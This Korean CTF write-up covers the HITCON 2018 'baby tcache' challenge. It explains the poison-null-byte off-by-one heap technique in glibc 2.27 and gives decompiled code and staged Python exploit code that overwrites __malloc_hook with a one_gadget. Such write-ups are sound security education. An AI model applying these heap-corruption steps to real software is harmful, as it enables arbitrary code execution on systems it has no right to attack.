---
title: "Poison-null-byte(hitcon2018 baby tcache)[kr]"
date : 2026-01-26 00:00:00 +0900
categories: [Pwnable, Heap, Poison-null-byte, ]
tags : [poison-null-byte, pwn , glibc 2.27 , tcache , unsorted-bin,malloc_hook , hitcon2018 , baby tcache]
---

## Overview

Hitcon 2018에 출제되었던 baby tcache를 통해 1byte크기의 null값으로 쉘을 딸수있는 Poison null byte 기법에 대해 알아보자.

baby_tcache-amd64-2.27-3ubuntu1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter libs/amd64/2.27/3ubuntu1/ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=568b13c1c82f696eeea89967a57a43eaf6bbec5b, stripped

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
```

## function

### main
```c
{
  long lVar1;
  
  init_00100aab();
  while( true ) {
    while( true ) {
      menu_00100bff();
      lVar1 = get_int_00100b27();
      if (lVar1 != 2) break;
      delete_00100d85();
    }
    if (lVar1 == 3) break;
    if (lVar1 == 1) {
      New_00100c6b();
    }
    else {
      puts("Invalid Choice");
    }
  }
                    /* WARNING: Subroutine does not return */
  _exit(0);
}

```
### new

```c

void New_00100c6b(void)

{
  ulong __size;
  void *pvVar1;
  int idx;
  
  idx = 0;
  while( true ) {
    if (9 < idx) {
      puts(":(");
      return;
    }
    if (*(long *)(&PTR_00302060 + (long)idx * 8) == 0) break;
    idx = idx + 1;
  }
  printf("Size:");
  __size = get_int_00100b27();
  if (__size < 8193) {
    pvVar1 = malloc(__size);
    if (pvVar1 != (void *)0x0) {
      printf("Data:");
      get_read_00100b88(pvVar1,__size & 0xffffffff);
      *(undefined1 *)(__size + (long)pvVar1) = 0; //Vuln!!!!!
      *(void **)(&PTR_00302060 + (long)idx * 8) = pvVar1;
      *(ulong *)(&size_003020c0 + (long)idx * 8) = __size;
      return;
    }
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
                    /* WARNING: Subroutine does not return */
  exit(-2);
}
```

### delete

```c

void delete_00100d85(void)

{
  ulong uVar1;
  
  printf("Index:");
  uVar1 = get_int_00100b27();
  if (9 < uVar1) {
                    /* WARNING: Subroutine does not return */
    exit(-3);
  }
  if (*(long *)(&PTR_00302060 + uVar1 * 8) != 0) {
    memset(*(void **)(&PTR_00302060 + uVar1 * 8),0xda,*(size_t *)(&size_003020c0 + uVar1 * 8));
    free(*(void **)(&PTR_00302060 + uVar1 * 8));
    *(undefined8 *)(&PTR_00302060 + uVar1 * 8) = 0;
    *(undefined8 *)(&size_003020c0 + uVar1 * 8) = 0;
  }
  puts(":)");
  return;
}
```

## vulnerable

취약점은 new 함수에서 데이터를 입력받을때 read 의 반환값뒤에 \x00값을 넣음으로써 원래크기보다 한 바이트 뒤에 \x00값을 넣을수있다.

    *(undefined1 *)(__size + (long)pvVar1) = 0; //Vuln!!!!!


malloc을 통해 0x58 같은 크기의 데이터를 요청하면 malloc은 메타데이터를 포함한 0x60크기의 데이터를 돌려준다.

이로 인해 0x58만큼의 데이터를 쓰면 0x59(base+0x58)위치에 \x00값을 넣음으로써 다음 청크의 메타데이터를 바꿀수있게된다.

이 문제같은 경우는 make,delete 기능만 있어 leak을 하기 어려워보인다. 또한 free를 하면서 \xda값으로 모두 채우기때문에 일반적인 poison null byte는 어렵다.

고로 libc주소를 조작가능한 청크로(아마 __malloc_hook으로) 배치시켜 하위 2바이트를 brute force하는 식으로 진행해야한다.

하지만 로컬상황에서 libc파일을 구하지못해 aslr을 고정시키고 진행한다.

### poison null byte

동적할당으로 받은 청크는 기본적으로 base-0x10 위치에 prev_size값과 , 현재 청크의 prev_inuse를 포함한 size값을 저장한다.

prev_inuse의 비트가 켜져있으면 이전 청크는 할당되어 사용중이고 prev_inuse가 꺼져있으면 이전 청크가 해제되었다는걸 알수있다.

이전 청크가 free상태라면 unsorted bin,small bin , large bin은 이전 청크 크기만큼 병합을 시도한다.

하지만 tcache,fast bin 은 병합을 하지않는다(fastbin은 경우에 따라 할수도있음).

이런 특징을 이용해서 prev_size와 prev_inuse 값을 조작하면서 __malloc_hook을 컨트롤 가능한 주소로 만들것이다.

### exploit flow

총 3번의 큰 흐름으로 나누어서 malloc_hook 근처에 3개의 주소를 조작가능한 주소로 설정한다.

프로그램에서 동적할당주소를 ptr[0~9]로 총10개를 보관하고 delete할때마다 ptr에서 주소를 지우는식으로 동작한다.

무한정 주소를 이용할수없어서 적절히 삭제하고 재할당하는식으로 진행을 해야한다.

malloc_hook주소에 libc값을 넣기위해서 malloc_hook근처의 주소A를 heap chunk형태로 만들어 해제하고 malloc_hook을 해제해서 A의 주소가 malloc_hook->fd에 들어가는 형태로 만들어야한다.

* ex)
libc
```
0x00[A]             0x0000000000000000  0x0000000000000061
0x10[B]             0x0000000000000000  0x0000000000000000
0x20                0x0000000000000000  0x0000000000000000
0x30                0x0000000000000000  0x0000000000000000
0x40                0x0000000000000000  0x0000000000000000
0x50                0x0000000000000000  0x0000000000000000
0x60                0x0000000000000000  0x0000000000000061
0x70[C,malloc_hook] 0x000000one_gadget  0x0000000000000000
0x80                0x0000000000000000  0x0000000000000000
```

총 3개의 A,B,C 주소를 할당받아야한다.


1, 먼저 A를 할당받고 0x00,0x60위치에 size로 쓰일 0x61(다른값을 써도됨)값을 쓴다.
2, 다음 B를 할당받는다 후에 malloc_hook->fd에 B의 주소를 넣기위함
3, malloc_hook의 주소인 C를 할당받는다.
4, malloc_hook을 할당받고 malloc_hook 주소를 free한다
5, 그럼 malloc_hook위치에 fd값인 libc의 B의 주소가 들어가고 재할당으로 뒤에 one_gadget값만큼의 바이트를 bruteforce하면된다.


### A chunk
```python

#---------------------------------------------
new(0x508,b'a1')  #0 , unsorted bin 0
new(0x70,b'a2')   #1 
new(0x1008,b'a3') #2 
new(0x4f0,b'a4')  #3 , unsorted bin 1
new(0x70,b'a5')   #4
new(0x70,b'a6')   #5 barrier for top chunk

delete(4)
delete(1)   # tcache bin[0x70] b->f->null
delete(2)
new(0x1008,b'c'*(0x1000-0x8)+p64(0)+p64(0x510+0x80+0x1010))  #1,overwrite 0x4f0 prev_inuse
delete(0)   #for bypass verification
delete(3)   #consolidation a-b-c-d chunk
            #b-tcache,c-inuse

new(0x500,b'a') #0 , for padding
new(0x1080,p16(0x4bc0)) #2 go to b[tcache]->fd , need brute force
new(0x70,b'aaaa') #3
new(0x70,p64(0)+p64(0x61)+p64(0)*11+p64(0x61)) #4, overwrite
#heap layout
#0x510 -> 0x80 -> 0x1010 -> 0x500 -> 0x80 -> 0x80
#0x510 -> 0x70(aaaa) = 0x1090 -> 0x500(free) -> 0x80(free) -> 0x80
#          
#---------------------------------------------

```

    * 0, prev_size와 prev_inuse가 조작된 청크와 병합할 unsorted bin크기의 청크를 먼저 할당
    * 1, A주소를 fd에 넣기위해 a2청크를 생성한다.
    * 2, 다음청크 조작과 후에 조작용 tcache청크를 위해 넉넉하게 잡는다.
    * 3, 조작될 청크를 unsorted bin 크기로 만든다.
    * 4, 첫번쨰 tcache용
    * 5, top chunk과 병합되는걸 막기위한 청크  

이렇게 첫번째 A를 위한 세팅은 끝났다.

0x70 size의 청크를 2번 해제하면서 조작할 fd를 a2에 위치시킨다.

그후 a4앞의 a3청크를 해제하고 재할당함으로써 prev_size를 젤 앞의 a1청크까지 계산이되도록 설정하고 prev_inuse를 0으로 만든다.

이렇게하면 a4청크의 앞자리는 이렇게 설정된다.
```
a4 
0x00     :      0x00000000000015a0 0x0000000000000500
0x10[a4] :      0x0000000000000000 0x0000000000000000
```

이렇게 설정됨으로써 free(a4)를 진행하면 free는 원래 0x501으로 설정되어야할값이 0x500으로 바뀜으로써 이전 청크가 비어있다고 판단한다.

a1 청크를 먼저 해제시킴으로써 if (chunksize(P) != prev_size(next_chunk(P)))
    abort(); 
검증을 피해간다.

그리고 prev_size값인 0x15a0을 확인하고 이전 청크의 크기가 0x15a0인걸로 알아 -0x15a0의 위치인 청크부터 0x4f0까지 모두 병합시킨다.


최종적으로 0x510,0x80,0x1010,0x500크기의 청크들이 하나의 거대한 unsorted bin으로 합쳐지게된다.

tcache bin인 a2는 free된 상태에 fd값이 적힌채로 총 0x1aa0크기의 unsorted bin에 노출된다.

그 뒤로 a1위치의 0x500을 할당하고 계산의 편함과 후에 재사용할 청크를위해 0x1080만큼 요청하면서 a2의 fd값의 4바이트를 0x4bc0으로 덮는다.(aslr환경에서는 brute force 필요)

그러고 tcache를 뺴주면서 조작된 주소인 A를 할당받아 malloc_hook을위한 가짜 청크 구조를 생성한다.

### B chunk

A chunk와 마찬가지로 진행한다.

```python

#---------------------------------------------
#---------get malloc_hook addr----------------

new(0x4f0,b'b'*4)   #6
delete(2)
new(0x20,b'cccc')    #2
new(0x20,b'cccc')    #7
#0x510 -> 0x30 -> 0x30 -> 0x1030 -> 0x500 -> 0x80(free) -> 0x80
new(0x1028,b'd'*0x1020+p64(0x510+0x30+0x30+0x1030)) #8
delete(7)
delete(2)
delete(0)
delete(6) #consolidation 0x510,0x30,0x30,0x1030,0x500
new(0x500,b'dddd')  #0
new(0x1080,p16(0x4bd0)) #2
new(0x20,'dddd') #6
new(0x20,p64(0)) #7 #0x4bd0
#          
#---------------------------------------------
#heap layout
#0x510 -> 0x20(dddd)=0x1090 -> 0x500(free) -> 0x80(free) -> 0x80


```

A chunk를 할당받으면서 채워넣었단 0x1080크기를 다시 해제함으로써 조작하기 편한 위치에 공간을 만들고 똑같이 반복해서 chunk B를 생성한다.


### C chunk

10개의 주소만 저장하는 프로그램 구조때문에 delete의 순서를 바꾸면서 조금 복잡하게 만들어야한다.

하지만 근본적으로 chunk A,B와 동작은 똑같다.
내부 청크를 해제하고 공간을 만들고 null byte취약점을 이용해 tcache의 fd값을 조작한다.


```python

#heap layout
#0x510 -> 0x20(dddd)=0x1090 -> 0x500(free) -> 0x80(free) -> 0x80

new(0x4f0,b'f'*4)  #9
delete(7)   #free 0x4bd0 , free chunk B
delete(2)   #0x1090
new(0x40,b'ffff')   #2    
new(0x40,b'ffff')   #7
delete(0)   #0x510
new(0xfe8,b'f'*0xfe0+p64(0x510+0x50+0x50+0xff0))    #0
#0x510(free) -> 0x50 -> 0x50 -> 0xfd0 -> 0x500 -> 0x80(free) -> 0x80
delete(7)
delete(2)
delete(9) #consolidation 0x510,0x60,0x60,0xfd0,0x500
new(0x500,b'ffff')  #2
new(0x1080,p16(0x4c30)) #7
new(0x40,'ffff')    #9
delete(2)   #just for ptr space

new(0x40,'abcd')    #2 , abcd->one_gadget 


new(0x50,p16(one_gadget))

gdb.attach(p)
p.interactive()

```
10개의 청크만 저장 가능하기때문에 Chunk B를 미리 free시키고 진행한다.

마지막에 공간이 부족해 젤 처음 위치한 0x500크기의 청크를 해제하고 0x40크기를 할당받는다. 이때 malloc_hook 위치의 주소를 할당받게되고 할당받은 malloc_hook주소를 다시 free함으로써 malloc_hook->fd에 chunk B의 주소가 들어가게된다.

chunk B의 주소는 libc안의 위치임으로 one_gadget의 offset만큼의 값을 malloc_hook을 재할당받아 원하는값을 넣음으로써(여기서는 abcd) exploit을 한다.

![exploit](/assets/img/posts/poison_null_byte/1.png)




아마 실제환경에서는 libc 주소를 하나 정해놓고 미리 one_gadget의 offset , malloc_hook의 offset등을 계산해놓고 bruteforce를 진행을하던가 아니면 _IO_2_1_stdout의 주소를 bruteforce로 할당받아 buf_base,buf_end등의 값들을 조작해서 leak하는 방법도있을꺼같다.

이렇게 한바이트 크기의 \x00값의 오버플로우도 원하는 주소와 원하는 크기의 데이터를 마음대로 할당할수있는 강력한 기법이 될수있다.



